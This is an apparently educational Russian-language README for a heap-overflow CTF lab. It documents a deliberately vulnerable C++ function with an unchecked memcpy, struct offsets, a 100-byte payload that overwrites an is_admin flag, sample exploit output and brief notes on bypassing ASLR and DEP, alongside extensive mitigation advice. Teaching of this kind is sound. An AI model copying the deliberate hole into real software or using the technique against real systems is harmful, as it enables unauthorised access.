# Heap Overflow CTF Challenge

Проект для изучения и демонстрации эксплуатации уязвимости Heap Overflow на C++.

## Описание уязвимости

### Что такое Heap Overflow?

Heap Overflow (переполнение кучи) — это уязвимость, возникающая когда программа записывает данные за пределы выделенного буфера в куче (heap). В отличие от Stack Overflow, Heap Overflow работает с динамически выделяемой памятью через функции `malloc()`, `calloc()`, `realloc()` и т.д.

### Почему возникает уязвимость?

Уязвимость возникает по следующим причинам:

1. **Отсутствие проверки границ**: Функции вроде `strcpy()`, `strcat()`, `sprintf()` не проверяют размер выделенного буфера перед копированием данных.

2. **Неправильное использование небезопасных функций**: Разработчики используют функции, которые не ограничивают длину копируемых данных, даже при работе с динамической памятью.

3. **Отсутствие защиты компилятора**: Программа скомпилирована без защитных механизмов (Heap Canaries, ASLR, DEP).

4. **Прямая работа с памятью**: В C/C++ программист сам управляет памятью, что позволяет записывать данные за пределы выделенных областей в куче.

5. **Неправильное управление памятью**: Отсутствие проверок границ при работе с динамически выделенными буферами.

### Механизм эксплуатации

При переполнении кучи злоумышленник может:
- Перезаписать соседние chunk'и в куче
- Перезаписать метаданные heap (chunk headers)
- Изменить значения переменных в соседних структурах
- Выполнить произвольный код через перезапись указателей на функции
- Прочитать секретные данные из памяти

### Отличия от Stack Overflow

| Stack Overflow | Heap Overflow |
|----------------|---------------|
| Переполнение буфера в стеке | Переполнение буфера в куче |
| Перезапись адреса возврата | Перезапись соседних chunk'ов |
| Использует статические буферы | Использует динамические буферы (malloc) |
| Проще эксплуатировать | Сложнее эксплуатировать (зависит от аллокатора) |

## Описание уязвимости в данном приложении

### Локация уязвимости

Уязвимость находится в файле `vulnerable_heap_overflow.cpp`, в функции `vulnerable_heap_operation()`:

```cpp
#pragma pack(1)  // Отключаем выравнивание структуры для предсказуемости смещений
struct UserData {
    char buffer[32];        // Буфер для пользовательского ввода (в начале структуры)
    char username[32];
    char password[32];
    int is_admin;          // Цель эксплуатации - установить в 1
    char secret_flag[128];
};
#pragma pack()  // Возвращаем стандартное выравнивание

void vulnerable_heap_operation(int client_socket, const char* input) {
    // Выделяем структуру UserData в куче
    // Структура содержит буфер внутри себя
    UserData* user = (UserData*)malloc(sizeof(UserData));
    
    // Инициализируем структуру
    user->is_admin = 0;
    strncpy(user->secret_flag, get_flag(), sizeof(user->secret_flag) - 1);
    
    // КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: memcpy без проверки границ буфера
    // Буфер находится ВНУТРИ структуры, переполнение перезапишет другие поля!
    size_t input_len = strlen(input);
    memcpy(user->buffer, input, input_len + 1);  // ← Здесь происходит переполнение кучи
    
    // Проверка прав администратора
    if (user->is_admin == 1) {
        // Выводим флаг
    }
}
```

### Детали уязвимости

1. **Размер буфера**: 32 байта (находится внутри структуры `UserData`)
2. **Уязвимая функция**: `memcpy(user->buffer, input, strlen(input) + 1)` — копирует пользовательский ввод без проверки границ буфера
3. **Расположение данных**: 
   - Буфер находится **внутри** структуры `UserData` в начале
   - При переполнении `buffer` перезаписываются другие поля структуры
4. **Структура UserData**:
   - `buffer[32]` — 32 байта (начало структуры, здесь происходит переполнение)
   - `username[32]` — 32 байта (смещение: 32 байта)
   - `password[32]` — 32 байта (смещение: 64 байта)
   - `is_admin` (int) — 4 байта (смещение: 96 байт, цель эксплуатации!)
   - `secret_flag[128]` — 128 байт (смещение: 100 байт)
5. **Выравнивание структуры**: Используется `#pragma pack(1)` для отключения padding между полями структуры, что обеспечивает предсказуемые смещения
6. **Защита отключена**: Программа скомпилирована с флагами `-fno-stack-protector -z execstack -no-pie`
7. **Использование memcpy**: Вместо `strcpy` используется `memcpy`, что позволяет копировать null byte и корректно устанавливать `is_admin = 1`

### Как эксплуатировать

1. Отправить данные длиннее 32 байт
2. Переполнение `buffer` перезапишет другие поля структуры `user`
3. Установить `is_admin = 1` через перезапись поля в структуре (смещение 96 байт)
4. Получить флаг в формате `practice{...}`

### Структура памяти в куче

```
[Heap Layout - UserData структура]
+------------------+
| buffer[32]       | ← Начало структуры (смещение: 0 байт)
+------------------+
| username[32]     | ← Смещение: 32 байта
+------------------+
| password[32]     | ← Смещение: 64 байта
+------------------+
| is_admin (4)     | ← Смещение: 96 байт (цель эксплуатации!)
+------------------+
| secret_flag[128] | ← Смещение: 100 байт
+------------------+
```

При переполнении `buffer` на 32+ байта, мы перезаписываем:
- `username` (32 байта, начиная со смещения 32)
- `password` (32 байта, начиная со смещения 64)
- `is_admin` (4 байта, начиная со смещения 96) — устанавливаем в 1

## Способы защиты от уязвимости

### 1. Использование безопасных функций

**Вместо небезопасных:**
```cpp
strcpy(buffer, input);                    // ❌ Небезопасно
memcpy(buffer, input, strlen(input) + 1); // ❌ Небезопасно (без проверки границ)
strcat(buffer, input);                    // ❌ Небезопасно
sprintf(buffer, "%s", str);               // ❌ Небезопасно
```

**Используйте безопасные аналоги:**
```cpp
strncpy(buffer, input, sizeof(buffer) - 1);  // ✅ Безопасно
buffer[sizeof(buffer) - 1] = '\0';           // ✅ Гарантируем null-terminator
snprintf(buffer, sizeof(buffer), "%s", str); // ✅ Безопасно
strlcpy(buffer, input, sizeof(buffer));       // ✅ Безопасно (BSD)
```

### 2. Проверка размера перед копированием

```cpp
// ✅ Правильный подход
size_t input_len = strlen(input);
if (input_len >= buffer_size) {
    // Обработка ошибки
    return;
}
strncpy(buffer, input, buffer_size - 1);
buffer[buffer_size - 1] = '\0';
```

### 3. Использование безопасных библиотек

```cpp
// Использование std::string в C++
std::string buffer;
buffer = input;  // ✅ Автоматическое управление памятью

// Использование strlcpy/strlcat (BSD)
strlcpy(buffer, input, sizeof(buffer));
```

### 4. Включение защит компилятора

```bash
# Включить защиту кучи (если доступна)
g++ -fsanitize=address vulnerable.cpp

# Включить DEP/NX
g++ -z noexecstack vulnerable.cpp

# Включить ASLR
g++ -pie -fPIE vulnerable.cpp

# Все защиты вместе
g++ -fsanitize=address -z noexecstack -pie -fPIE -D_FORTIFY_SOURCE=2 vulnerable.cpp
```

### 5. Использование современных аллокаторов

- **jemalloc** — улучшенная защита от heap overflow
- **tcmalloc** — защита от переполнения
- **AddressSanitizer (ASAN)** — обнаружение переполнений кучи

### 6. Статический анализ кода

Используйте инструменты для поиска уязвимостей:
- **Coverity**
- **Clang Static Analyzer**
- **cppcheck**
- **PVS-Studio**
- **Valgrind** (динамический анализ)

### 7. Code Review

Проводите обязательный код-ревью с фокусом на:
- Использование небезопасных функций с динамической памятью
- Проверку границ массивов перед копированием
- Валидацию пользовательского ввода
- Правильное использование `malloc`/`free`

### 8. Использование современных языков

Рассмотрите переход на языки с автоматическим управлением памятью:
- **Rust** (безопасность памяти на уровне компилятора)
- **Go** (проверка границ массивов, garbage collector)
- **Java/C#** (управляемая память, проверка границ)

## Запуск приложения

### Требования

- Docker и Docker Compose
- Python 3 (для эксплойта)
- netcat (nc) или ncat для подключения

### Порядок запуска программ

#### Шаг 1: Настройка кодировки (для Windows PowerShell)

Если вы используете Windows PowerShell и видите искаженные символы (например, `╨Ф╨╛╨▒╤А╨╛` вместо русского текста), запустите скрипт настройки:

```powershell
# Автоматическая настройка кодировки UTF-8
.\setup-encoding.ps1
```

Или вручную установите кодировку:

```powershell
# Установить кодировку UTF-8 для текущей сессии
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8
chcp 65001
```

**Примечание:** Скрипт `setup-encoding.ps1` автоматически настраивает кодировку. Также `exploit.py` автоматически исправляет кодировку при запуске на Windows.

**Альтернатива:** Используйте Windows Terminal или WSL для лучшей поддержки UTF-8.

#### Шаг 2: Запуск уязвимого приложения через Docker

```bash
# Собрать и запустить контейнер
docker-compose up --build

# Или в фоновом режиме (рекомендуется)
docker-compose up -d --build
```

После запуска вы должны увидеть:
```
Сервер запущен на порту 1337
Подключитесь через: nc <host> 1337
```

#### Шаг 3: Проверка работы сервера

В **отдельном терминале** подключитесь к серверу:

**На Linux/Mac:**
```bash
nc localhost 1337
```

**На Windows (если установлен Nmap):**
```powershell
ncat localhost 1337
```

**На Windows (альтернатива через PowerShell):**
```powershell
$client = New-Object System.Net.Sockets.TcpClient("localhost", 1337)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$reader.ReadLine()  # Читаем приветствие
$writer.WriteLine("test")  # Отправляем тестовые данные
$reader.ReadLine()  # Читаем ответ
$client.Close()
```

Вы должны получить приветствие: `=== Heap Overflow CTF Challenge ===`

#### Шаг 4: Запуск эксплойта

В **отдельном терминале** запустите Python-скрипт для эксплуатации:

**На Linux/Mac:**
```bash
# Базовое использование (подключение к localhost:1337)
python3 exploit.py

# С указанием хоста и порта
python3 exploit.py <HOST> <PORT>
```

**На Windows:**

Через PowerShell (рекомендуется сначала запустить `setup-encoding.ps1` для корректного отображения русского текста):
```powershell
python exploit.py

# С указанием хоста и порта
python exploit.py localhost 1337
```

**Примечание:** Скрипт `exploit.py` автоматически настраивает кодировку UTF-8 при запуске на Windows, поэтому русский текст будет отображаться корректно.

Эксплойт автоматически:
- Подключится к серверу
- Отправит переполнение кучи
- Получит флаг и сохранит его в `flag.txt`

#### Шаг 5: Остановка и очистка

```bash
# Остановить контейнер
docker-compose down

# Остановить и удалить volumes (если нужно)
docker-compose down -v
```

### Полезные команды

**Просмотр логов контейнера:**
```bash
docker-compose logs -f
```

**Перезапуск контейнера:**
```bash
docker-compose restart
```

**Проверка статуса:**
```bash
docker-compose ps
```

**Вход в контейнер для отладки:**
```bash
docker exec -it heap-overflow-vulnerable /bin/bash
```

### Изменение флага

Флаг задается в файле `docker-compose.yml` в переменной окружения `FLAG`:

```yaml
environment:
  - FLAG=practice{your_flag_here}
```

После изменения пересоберите контейнер:

```bash
docker-compose up --build
```

## POC-эксплойт для получения флага

### Запуск эксплойта

**Важно:** Убедитесь, что сервер запущен (см. раздел "Порядок запуска программ") перед запуском эксплойта.

**На Linux/Mac:**
```bash
# Базовое использование (подключение к localhost:1337)
python3 exploit.py

# С указанием хоста и порта
python3 exploit.py <HOST> <PORT>
```

**На Windows:**

Через PowerShell:
```powershell
python exploit.py

# С указанием хоста и порта
python exploit.py localhost 1337
```

**Примечание:** Скрипт `exploit.py` автоматически настраивает кодировку UTF-8 при запуске на Windows, поэтому русский текст будет отображаться корректно.

### Описание эксплойта

Эксплойт (`exploit.py`) выполняет следующие действия:

1. **Подключение к серверу** через TCP сокет
2. **Создание полезной нагрузки**:
   - Заполнение буфера (32 байта символами 'A')
   - Перезапись username (32 байта символами 'B')
   - Перезапись password (32 байта символами 'C')
   - Установка `is_admin = 1` (4 байта в little-endian формате)
3. **Отправка эксплойта** на сервер
4. **Получение ответа** от сервера с флагом

### Структура payload

```
Payload (100 байт):
+------------------+
| 'A' * 32         | ← Заполнение buffer
+------------------+
| 'B' * 32         | ← Перезапись user->username
+------------------+
| 'C' * 32         | ← Перезапись user->password
+------------------+
| 0x01 0x00 0x00 0x00 | ← is_admin = 1 (little-endian)
+------------------+
```

### Модификация эксплойта для реальной эксплуатации

Для реальной эксплуатации в более сложных сценариях может потребоваться:

1. **Анализ heap layout:**
```bash
# Использование gdb для анализа кучи
gdb ./vulnerable_heap_overflow
(gdb) break vulnerable_heap_operation
(gdb) run
(gdb) x/100x $heap_start
```

2. **Обход защит:**
   - **ASLR**: использование утечки адресов
   - **DEP**: построение ROP chain
   - **Heap Canaries**: утечка канарейки или обход
   - **Heap metadata protection**: анализ структуры chunk'ов

3. **Модификация payload в exploit.py:**
```python
# Пример для более сложной эксплуатации
payload = b'A' * 32  # buffer
payload += b'B' * 32  # username
payload += b'C' * 32  # password
payload += struct.pack("<I", 1)  # is_admin = 1
# Дополнительные данные для перезаписи других полей
```

### Пример использования

**На Linux/Mac:**
```bash
$ python3 exploit.py
============================================================
POC Эксплойт для Heap Overflow
Подключение к localhost:1337
============================================================

[+] Получено: === Heap Overflow CTF Challenge ===
Enter your data (will be stored in heap):

[+] Создана полезная нагрузка: 100 байт
[+] Размер буфера: 32 байт
[+] Переполнение: 68 байт
[+] is_admin будет установлен в: 1

[+] Отправка эксплойта...
[+] Ответ сервера (XX байт):
----------------------------------------
ADMIN ACCESS GRANTED!
Congratulations! Here's your flag: practice{Heap_Overflow_Exploitation_Success!}
----------------------------------------

🎉 🎉 🎉 ФЛАГ НАЙДЕН! 🎉 🎉 🎉
Флаг: practice{Heap_Overflow_Exploitation_Success!}
Флаг сохранен в flag.txt
```

**На Windows:**
```powershell
PS> python exploit.py
============================================================
POC Эксплойт для Heap Overflow
Подключение к localhost:1337
============================================================

[+] Получено: === Heap Overflow CTF Challenge ===
Enter your data (will be stored in heap):

[+] Создана полезная нагрузка: 100 байт
[+] Размер буфера: 32 байт
[+] Переполнение: 68 байт
[+] is_admin будет установлен в: 1

[+] Отправка эксплойта...
[+] Ответ сервера (XX байт):
----------------------------------------
ADMIN ACCESS GRANTED!
Congratulations! Here's your flag: practice{Heap_Overflow_Exploitation_Success!}
----------------------------------------

🎉 🎉 🎉 ФЛАГ НАЙДЕН! 🎉 🎉 🎉
Флаг: practice{Heap_Overflow_Exploitation_Success!}
Флаг сохранен в flag.txt
```

## Структура проекта

```
.
├── vulnerable_heap_overflow.cpp  # Уязвимая программа на C++
├── exploit.py                    # POC эксплойт на Python
├── Dockerfile                    # Конфигурация Docker образа
├── docker-compose.yml            # Конфигурация Docker Compose
├── start.sh                      # Скрипт запуска сервера
├── setup-encoding.ps1            # Скрипт настройки кодировки для PowerShell
├── .gitignore                    # Игнорируемые файлы Git
└── README.md                     # Документация проекта
```

## Важные замечания

⚠️ **Этот проект создан исключительно в образовательных целях!**

- Используйте только на собственных системах или с явного разрешения
- Не используйте для атак на реальные системы
- Изучайте безопасность ответственно и этично
- Соблюдайте законодательство вашей страны

## Дополнительные ресурсы

- [OWASP Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- [CTF Wiki - Heap Overflow](https://ctf-wiki.org/pwn/linux/user-mode/heap/heap-overflow/)
- [Exploit-DB](https://www.exploit-db.com/) - база данных эксплойтов
- [pwnable.kr](https://pwnable.kr/) - практические задания по эксплуатации
- [Heap Exploitation](https://heap-exploitation.dhavalkapil.com/) - подробное руководство по эксплуатации кучи

